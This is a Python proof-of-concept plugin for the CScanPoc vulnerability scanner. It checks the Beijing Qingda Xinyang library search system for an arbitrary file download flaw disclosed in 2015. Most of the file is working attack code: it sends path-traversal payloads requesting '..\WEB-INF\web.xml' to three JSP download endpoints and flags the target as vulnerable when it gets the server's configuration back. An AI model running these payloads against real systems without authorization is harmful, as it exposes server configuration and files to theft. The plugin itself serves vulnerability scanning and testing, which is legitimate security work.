# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'Infosea_0014' # 平台漏洞编号，留空
    name = '北京清大新洋图书检索系统 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-08-20'  # 漏洞公布时间
    desc = '''
        北京清大新洋图书检索系统，多处存在任意文件下载漏洞： 
        module/download.jsp
        module/exceldown.jsp
        module/exceldownload.jsp
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '清大新洋'  # 漏洞应用名称
    product_version = '北京清大新洋图书检索系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '68025feb-cd19-43cc-bee4-01a0b11e145c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2015-0134085
            hh = hackhttp.hackhttp() 
            arg = self.target       
            payloads= [
                '/module/download.jsp?filename=..\WEB-INF\web.xml',
                '/module/exceldown.jsp?filename=..\WEB-INF\web.xml',
                '/module/exceldownload.jsp?filename=..\WEB-INF\web.xml'
            ]
            for payload in payloads:
                code, head, res, errcode, _ = hh.http(arg + payload)
                
                if code == 200 and ' <servlet-mapping>' in res  and 'web-app version' in res:
                    #security_hole(arg + payload + "   :file download")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()